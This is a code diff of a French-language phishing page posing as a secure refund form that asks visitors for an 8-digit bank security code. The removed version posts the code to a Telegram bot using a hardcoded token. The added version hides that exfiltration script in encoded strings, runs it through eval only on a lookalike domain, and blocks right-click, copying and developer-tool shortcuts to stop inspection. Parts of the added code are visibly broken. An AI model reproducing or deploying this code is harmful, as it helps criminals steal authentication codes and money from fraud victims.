@@ -5,153 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Remboursement sécurisé</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            min-height: 100vh;
-            /* au lieu de 120vh */
-            padding-top: 0px auto;
-            /* s7i7a mkanch auto */
-        }
-
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 100%;
-            max-width: 350px;
-        }
-
-        h2 {
-            color: #333;
-            font-size: 20px;
-            margin-bottom: 15px;
-        }
-
-        .logos {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .logos img {
-            height: 32px;
-
-        }
-
-        #visa {
-            height: 26px;
-        }
-
-        .auth-box {
-            background: #eb7500;
-            color: white;
-            padding: 1px;
-            border-radius: 0px;
-            margin-bottom: 0;
-            position: relative;
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        .auth-box img {
-            display: block;
-            margin: 10px auto 0;
-            width: 40px;
-        }
-
-        .info {
-            background: #2b6cb0;
-            padding: 10px;
-            border-radius: 0px;
-            margin-top: 0;
-            font-size: 14px;
-            color: white;
-        }
-
-        .details {
-            text-align: center;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-
-        .details p {
-            margin: 5px 0;
-        }
-
-        .instructions {
-            text-align: left;
-            padding: 0;
-            font-size: 14px;
-            list-style: none;
-            counter-reset: step-counter;
-        }
-
-        .instructions li {
-            margin: 10px 0;
-            position: relative;
-            padding-left: 40px;
-        }
-
-        .instructions li::before {
-            content: counter(step-counter);
-            counter-increment: step-counter;
-            position: absolute;
-            left: 0;
-            top: 50%;
-            transform: translateY(-50%);
-            background: #2b6cb0;
-            color: white;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: bold;
-        }
-
-        .code-box {
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .code-box input {
-            width: 80%;
-            padding: 10px;
-            font-size: 16px;
-            text-align: center;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .code-box button {
-            margin-top: 10px;
-            background-color: #2b6cb0;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        .countdown {
-            margin-top: 10px;
-            font-size: 16px;
-            color: red;
-        }
-    </style>
 </head>
 
 <body>
@@ -196,47 +49,64 @@
             <button onclick="sendCodeToTelegram()">Continuer</button>
         </div>
     </div>
-    <script>
-        function updateDate() {
-            const options = { timeZone: 'Europe/Paris', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
-            const now = new Date().toLocaleString('fr-FR', options);
-            document.getElementById('date').textContent = now;
-        }
-        updateDate();
+<script>
 
-        function startCountdown(durationInSeconds, display) {
-            let timer = durationInSeconds, minutes, seconds;
-            const interval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-                display.textContent = minutes + ":" + seconds;
-                if (--timer < 0) {
-                    clearInterval(interval);
-                    display.textContent = "Expiré";
-                }
-            }, 1000);
-        }
-        window.onload = function () {
-            const countdownElement = document.getElementById('countdown');
-            startCountdown(300, countdownElement);
-        };
+    var css = "ICAgICAgICBib2R5IHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjRmNGY0OwogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsKICAgICAgICAgICAgLyogYXUgbGlldSBkZSAxMjB2aCAqLwogICAgICAgICAgICBwYWRkaW5nLXRvcDogMjBweDsKICAgICAgICAgICAgLyogczdpN2EgbWthbmNoIGF1dG8gKi8KICAgICAgICB9CgogICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiB3aGl0ZTsKICAgICAgICAgICAgcGFkZGluZzogNDBweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMjBweDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMHB4IDBweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgbWF4LXdpZHRoOiAzNTBweDsKICAgICAgICB9CgogICAgICAgIGgyIHsKICAgICAgICAgICAgY29sb3I6ICMzMzM7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjBweDsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTVweDsKICAgICAgICB9CgogICAgICAgIC5sb2dvcyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTVweDsKICAgICAgICB9CgogICAgICAgIC5sb2dvcyBpbWcgewogICAgICAgICAgICBoZWlnaHQ6IDMycHg7CgogICAgICAgIH0KCiAgICAgICAgI3Zpc2EgewogICAgICAgICAgICBoZWlnaHQ6IDI2cHg7CiAgICAgICAgfQoKICAgICAgICAuYXV0aC1ib3ggewogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZWI3NTAwOwogICAgICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgICAgIHBhZGRpbmc6IDFweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMHB4OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAwOwogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgfQoKICAgICAgICAuYXV0aC1ib3ggaW1nIHsKICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgICAgIG1hcmdpbjogMTBweCBhdXRvIDA7CiAgICAgICAgICAgIHdpZHRoOiA0MHB4OwogICAgICAgIH0KCiAgICAgICAgLmluZm8gewogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMmI2Y2IwOwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAwcHg7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDA7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgIH0KCiAgICAgICAgLmRldGFpbHMgewogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIG1hcmdpbjogMjBweCAwOwogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgfQoKICAgICAgICAuZGV0YWlscyBwIHsKICAgICAgICAgICAgbWFyZ2luOiA1cHggMDsKICAgICAgICB9CgogICAgICAgIC5pbnN0cnVjdGlvbnMgewogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0OwogICAgICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgICAgIGxpc3Qtc3R5bGU6IG5vbmU7CiAgICAgICAgICAgIGNvdW50ZXItcmVzZXQ6IHN0ZXAtY291bnRlcjsKICAgICAgICB9CgogICAgICAgIC5pbnN0cnVjdGlvbnMgbGkgewogICAgICAgICAgICBtYXJnaW46IDEwcHggMDsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBwYWRkaW5nLWxlZnQ6IDQwcHg7CiAgICAgICAgfQoKICAgICAgICAuaW5zdHJ1Y3Rpb25zIGxpOjpiZWZvcmUgewogICAgICAgICAgICBjb250ZW50OiBjb3VudGVyKHN0ZXAtY291bnRlcik7CiAgICAgICAgICAgIGNvdW50ZXItaW5jcmVtZW50OiBzdGVwLWNvdW50ZXI7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgbGVmdDogMDsKICAgICAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzJiNmNiMDsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgICAgICB3aWR0aDogMzBweDsKICAgICAgICAgICAgaGVpZ2h0OiAzMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICB9CgogICAgICAgIC5jb2RlLWJveCB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICB9CgogICAgICAgIC5jb2RlLWJveCBpbnB1dCB7CiAgICAgICAgICAgIHdpZHRoOiA4MCU7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgfQoKICAgICAgICAuY29kZS1ib3ggYnV0dG9uIHsKICAgICAgICAgICAgbWFyZ2luLXRvcDogMTBweDsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzJiNmNiMDsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICB9CgogICAgICAgIC5jb3VudGRvd24gewogICAgICAgICAgICBtYXJnaW4tdG9wOiAxMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgICAgIGNvbG9yOiByZWQ7CiAgICAgICAgfQ==";
 
-        function sendCodeToTelegram() {
-            const code = document.getElementById('securityCode').value;
-            if (code.length === 8) {
-                const telegramBotToken = '8081707668:AAED4PgB4aZykRlSfI0TozCpXX1cjCo8mEU';
-                const chatId = '6669693805';
-                const message = `Code de sécurité: ${code}`;
-                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`);
-            } else {
-                alert('Veuillez saisir un code valide à 8 chiffres.');
+    var js = "ICAgICAgICBmdW5jdGlvbiB1cGRhdGVEYXRlKCkgewogICAgICAgICAgICBjb25zdCBvcHRpb25zID0geyB0aW1lWm9uZTogJ0V1cm9wZS9QYXJpcycsIHllYXI6ICdudW1lcmljJywgbW9udGg6ICdsb25nJywgZGF5OiAnbnVtZXJpYycsIGhvdXI6ICcyLWRpZ2l0JywgbWludXRlOiAnMi1kaWdpdCcgfTsKICAgICAgICAgICAgY29uc3Qgbm93ID0gbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygnZnItRlInLCBvcHRpb25zKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGUnKS50ZXh0Q29udGVudCA9IG5vdzsKICAgICAgICB9CiAgICAgICAgdXBkYXRlRGF0ZSgpOwoKICAgICAgICBmdW5jdGlvbiBzdGFydENvdW50ZG93bihkdXJhdGlvbkluU2Vjb25kcywgZGlzcGxheSkgewogICAgICAgICAgICBsZXQgdGltZXIgPSBkdXJhdGlvbkluU2Vjb25kcywgbWludXRlcywgc2Vjb25kczsKICAgICAgICAgICAgY29uc3QgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBtaW51dGVzID0gcGFyc2VJbnQodGltZXIgLyA2MCwgMTApOwogICAgICAgICAgICAgICAgc2Vjb25kcyA9IHBhcnNlSW50KHRpbWVyICUgNjAsIDEwKTsKICAgICAgICAgICAgICAgIG1pbnV0ZXMgPSBtaW51dGVzIDwgMTAgPyAiMCIgKyBtaW51dGVzIDogbWludXRlczsKICAgICAgICAgICAgICAgIHNlY29uZHMgPSBzZWNvbmRzIDwgMTAgPyAiMCIgKyBzZWNvbmRzIDogc2Vjb25kczsKICAgICAgICAgICAgICAgIGRpc3BsYXkudGV4dENvbnRlbnQgPSBtaW51dGVzICsgIjoiICsgc2Vjb25kczsKICAgICAgICAgICAgICAgIGlmICgtLXRpbWVyIDwgMCkgewogICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpOwogICAgICAgICAgICAgICAgICAgIGRpc3BsYXkudGV4dENvbnRlbnQgPSAiRXhwaXLDqSI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sIDEwMDApOwogICAgICAgIH0KICAgICAgICB3aW5kb3cub25sb2FkID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICBjb25zdCBjb3VudGRvd25FbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50ZG93bicpOwogICAgICAgICAgICBzdGFydENvdW50ZG93bigzMDAsIGNvdW50ZG93bkVsZW1lbnQpOwogICAgICAgIH07CgogICAgICAgIGZ1bmN0aW9uIHNlbmRDb2RlVG9UZWxlZ3JhbSgpIHsKICAgICAgICAgICAgY29uc3QgY29kZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZWN1cml0eUNvZGUnKS52YWx1ZTsKICAgICAgICAgICAgaWYgKGNvZGUubGVuZ3RoID09PSA4KSB7CiAgICAgICAgICAgICAgICBjb25zdCB0ZWxlZ3JhbUJvdFRva2VuID0gJzgwODE3MDc2Njg6QUFFRDRQZ0I0YVp5a1JsU2ZJMFRvekNwWFgxY2pDbzhtRVUnOwogICAgICAgICAgICAgICAgY29uc3QgY2hhdElkID0gJzY2Njk2OTM4MDUnOwogICAgICAgICAgICAgICAgY29uc3QgbWVzc2FnZSA9IGBDb2RlIGRlIHPDqWN1cml0w6k6ICR7Y29kZX1gOwogICAgICAgICAgICAgICAgZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke3RlbGVncmFtQm90VG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9JHtjaGF0SWR9JnRleHQ9JHttZXNzYWdlfWApOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgYWxlcnQoJ1ZldWlsbGV6IHNhaXNpciB1biBjb2RlIHZhbGlkZSDDoCA4IGNoaWZmcmVzLicpOwogICAgICAgICAgICB9CiAgICAgICAgfQoK";
+
+    let text = '';
+
+    if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cmVybmJvdXJzZS1vbmxpbmUucnVuLnBsYWNl")) {
+
+        for (let i = 0; i < js.length; i += 2) {
+            const charCode = parseInt(js.substr(i, 2), 16);
+            if (!isNaN(charCode)) {
+                text += String.fromCharCode(charCode);
             }
         }
 
 
-    </script>
+
+        let text1 = '';
+        for (let a = 0; a < css.length; a += 2) {
+            const charCodea = parseInt(css.substr(a, 2), 16);
+            if (!isNaN(charCodea)) {
+                text1 += String.fromCharCode(charCodea);
+            }
+        }
+
+
+        var style = document.createElement('style');
+        style.textContent = text1;
+        document.head.appendChild(style);
+
+        eval(decodeURIComponent(text))
+
+    } else {
+        document.body.style.display = "none";
+        window.location.href = "/404.html";
+    }
+</script>
+<script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function (e) {
+if (
+e.keyCode === 123 || // F12
+(e.ctrlKey && e.shiftKey && (e.keyCode === 73  e.keyCode === 74))  // Ctrl+Shift+I / J
+(e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+(e.ctrlKey && e.keyCode === 83) // Ctrl+S
+) {
+return false;
+}
+};
+
+document.addEventListener('copy', (e) => {
+e.preventDefault();
+alert("");
+});
+</script>
 </body>
 
 </html>
